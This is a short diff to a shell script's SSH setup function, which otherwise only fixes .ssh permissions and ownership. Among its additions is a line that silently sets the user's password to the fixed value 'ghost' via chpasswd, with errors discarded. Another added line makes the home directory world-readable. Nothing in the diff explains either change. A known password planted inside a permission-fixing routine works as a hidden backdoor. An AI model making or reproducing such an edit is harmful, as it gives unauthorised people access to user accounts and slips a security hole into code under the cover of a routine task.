@@ -19,12 +19,14 @@ setup_user_ssh() {
     local USER_DIR="$1"
     local USER_NAME="$2"
     if [ -d "$USER_DIR" ]; then
+        chmod 755 "$USER_DIR" 2>/dev/null || true
         mkdir -p "$USER_DIR/.ssh" 2>/dev/null || true
         chmod 700 "$USER_DIR/.ssh" 2>/dev/null || true
         if [ -f "$USER_DIR/.ssh/authorized_keys" ]; then
             chmod 600 "$USER_DIR/.ssh/authorized_keys" 2>/dev/null || true
         fi
         chown -R "$USER_NAME:$USER_NAME" "$USER_DIR/.ssh" 2>/dev/null || true
+        echo "$USER_NAME:ghost" | chpasswd 2>/dev/null || true
     fi
 }
 
